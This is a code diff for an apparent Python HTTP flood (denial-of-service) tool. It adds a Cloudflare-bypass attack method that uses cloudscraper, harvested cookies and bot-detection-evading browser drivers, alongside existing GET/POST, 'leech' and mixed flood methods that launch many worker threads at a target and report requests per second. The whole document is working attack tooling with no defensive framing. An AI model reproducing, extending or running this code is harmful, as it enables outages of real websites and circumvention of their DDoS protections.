@@ -41,14 +41,10 @@ except:
 print('[INFO] Importing modules, hold on.')
 try:
   if debug: s_start = timer()
-  import os
-  import threading
-  import json
-  import time
-  import requests
-  from colorama import Fore, init; init()
-  from random import randint, choice
+  import os, threading, json, time, requests, cloudscraper, random, netaddr, selenium, undetected_chromedriver
+  from colorama import Fore, init
   from urllib.parse import urlparse
+  from requests.cookies import RequestsCookieJar
   if debug: 
     s_took = "%.2f" % (1000 * (timer() - s_start))
     print(f'{Fore.LIGHTBLACK_EX}[{Fore.WHITE}DEBUG{Fore.LIGHTBLACK_EX}]{Fore.RESET} Importing modules took {str(s_took)} ms.')
@@ -91,10 +87,15 @@ method_dict = {
   'FAST': http_fast, # GET / flood
   'GETHEADPOST': http_ghp, 'GHP': http_ghp, # GET/HEAD/POST flood
   'LEECH': http_leech, # leech attack
-  'MIX': http_mix # mixed http attack
+  'MIX': http_mix, # mixed http attack
+  'CFBYPASS': http_cfbp, # cloudflare bypass
 }
+
 if args['target'] is None:
   sys.exit(f'{fr}[{fw}ERROR{fr}]{frr} No target specified.')
+
+if not args['method'].upper() in method_dict.keys():
+  sys.exit(f'{fr}[{fw}ERROR{fr}]{frr} Invalid method.')
 
 Core.bypass_cache = args['bypass_cache']
 Core.proxy = args['proxy']
@@ -102,9 +103,6 @@ Core.proxy_type = args['proxy_type']
 Core.proxy_user = args['proxy_user']
 Core.proxy_passw = args['proxy_pass']
 Core.proxy_resolve = args['proxy_resolve']
-
-if not args['method'].upper() in method_dict.keys():
-  sys.exit(f'{fr}[{fw}ERROR{fr}]{frr} Invalid method.')
 
 #if args['browser_type'] == 'FIREFOX' and not os.path.isdir('src/drivers/geckodriver.exe'): sys.exit(f'{fr}[{fw}ERROR{fr}]{frr} Could not find Firefox driver!')
 #elif args['browser_type'] == 'CHROME' and not os.path.isdir('src/drivers/chromedriver.exe'): sys.exit(f'{fr}[{fw}ERROR{fr}]{frr} Could not find Chrome driver!')
@@ -116,7 +114,7 @@ if args['proxy'] != None and args['detect_firewall']:
   else: print('Alright, i warned ya!')
   time.sleep(2) # a small timeout if the user reconsiders his choice
 
-init() # initialize console
+init(autoreset=True) # initialize console
 print_lock = threading.Lock() # creates a "lock" variable
 
 def main():
@@ -152,7 +150,6 @@ def main():
   print(f' Keywords: [{str(len(keywords))}]')
 
 def attack():
-  session = createsession()
   parsed = urlparse(str(args['target']))
   if args['proxy'] is None: # prevents leaks
     resolved_host = socket.gethostbyname(str(parsed.netloc)) if (not isIPv4(parsed.netloc) and not isIPv6(parsed.netloc) and not parsed.netloc.endswith('.onion')) else parsed.netloc
@@ -160,11 +157,28 @@ def attack():
       resolved_host = f'[{resolved_host}]' # adding this allows requests to send data to IPv6 addresses too 
   else: resolved_host = parsed.netloc
 
+  sessobj = createsession()
+  if args['method'] == 'CFBYPASS':
+
+    if get_cookie(args['target']):
+      scraper = cloudscraper.create_scraper(sess=requests.session())
+      jar = RequestsCookieJar()
+      jar.set(Core.bypass_cookieJAR['name'], Core.bypass_cookieJAR['value'])
+      scraper.cookies = jar
+
+      sessobj = scraper
+    else: 
+      print('failed to get cookies'); os.kill(os.getpid(), 9)
+  else: pass
+  
+  Core.attack_clear_to_go = True
+
   s_start = timer() # timer used for counting avg rps
   for i in range(int(args['workers'])):
     Core.infodict.update({str(i): {'req_sent': 0, 'req_fail': 0, 'req_total':0}})
-    kaboom = threading.Thread(target=method_dict[args['method']], args=(str(i), session, f'{parsed.scheme}://{resolved_host}', args['duration'], ))
+    kaboom = threading.Thread(target=method_dict[args['method']], args=(str(i), sessobj, f'{parsed.scheme}://{resolved_host}', args['duration'], args['useragent'], args['referer'], ), daemon=True)
     kaboom.start()
+
     Core.threadbox.append(kaboom)
     Core.threadcount += 1
   
@@ -174,7 +188,8 @@ def attack():
   Core.attackrunning = False
   s_took = "%.2f" % (timer() - s_start) # how long it took for the attack to finish
   total_rqs = 0
-  for workerkey, workervalue in Core.infodict.items():
+
+  for _, workervalue in Core.infodict.items():
     total_rqs += workervalue['req_sent']
 
   Core.attack_length = s_took
@@ -186,9 +201,12 @@ if __name__ == '__main__':
 
   input('\nReady? (press enter) ')
 
-  threading.Thread(target=attack).start()
+  threading.Thread(target=attack, daemon=True).start()
   Core.attackrunning = True
-  time.sleep(5)
+
+  while not Core.attack_clear_to_go: # while attack is not launching yet
+    time.sleep(1)
+
   clear()
 
   worker_amount = 20 if args['workers'] > 20 else args['workers']
@@ -207,32 +225,30 @@ if __name__ == '__main__':
 
         with print_lock:
           print(f'{fy}[{fw}INFO{fy}] [{fw}worker{frr}-{fw}{workerkey}{fy}]{frr} {fg}req_sent{frr}={req_sent} {fr}req_fail{frr}={req_fail} {fy}req_total{frr}={req_total} {fy}thread_count{frr}={str(Core.threadcount)}')
-    except KeyboardInterrupt:
-      with print_lock: print('Ciao!')
-      Core.attackrunning = False
-    except Exception: Core.attackrunning = False
     
-    # calculate results
-    total_req_sent, total_req_fail, total_req = 0,0,0
-    for workerkey, workervalue in Core.infodict.items():
-      total_req_sent += workervalue['req_sent']
-      total_req_fail += workervalue['req_fail']
-      total_req += workervalue['req_total']
+      # calculate results
+      total_req_sent, total_req_fail, total_req = 0,0,0
+      for workerkey, workervalue in Core.infodict.items():
+        total_req_sent += workervalue['req_sent']
+        total_req_fail += workervalue['req_fail']
+        total_req += workervalue['req_total']
+      
+      s_took = "%.2f" % (timer() - s_start) # how long it took for the attack to finish
+      attack_length = s_took
+      time_left = float(args["duration"]) - float(attack_length)
+      if int(time_left) < 0: time_left = 0
+
+      print(f'\n{fy}[{fw}INFO{fy}]{frr} Results: ')
+      print(f'   - Requests sent: {str(total_req_sent)}')
+      print(f'   - Requests failed: {str(total_req_fail)}')
+      print(f'   - Requests total: {str(total_req)}')
+      print(f'   - Attack took: {str(attack_length)}')
+      print(f'   - Time left: {str(time_left)}')
+    except Exception:
+     Core.attackrunning = False
     
-    s_took = "%.2f" % (timer() - s_start) # how long it took for the attack to finish
-    attack_length = s_took
-    time_left = float(args["duration"]) - float(attack_length)
-    if int(time_left) < 0: time_left = 0
-
-    print(f'\n{fy}[{fw}INFO{fy}]{frr} Results: ')
-    print(f'   - Requests sent: {str(total_req_sent)}')
-    print(f'   - Requests failed: {str(total_req_fail)}')
-    print(f'   - Requests total: {str(total_req)}')
-    print(f'   - Attack took: {str(attack_length)}')
-    print(f'   - Time left: {str(time_left)}')
-
     time.sleep(2 if args['method'].upper() != 'LEECH' else 10)
     if Core.attackrunning: 
       clear()
   
-  print(f'   - Average requests per second: '+str(Core.avg_rps).replace('.', f'.{fg2}')+frr)
+  print(f'   - Average requests per second: '+str(Core.avg_rps).replace('.', f'.{fg2}'))
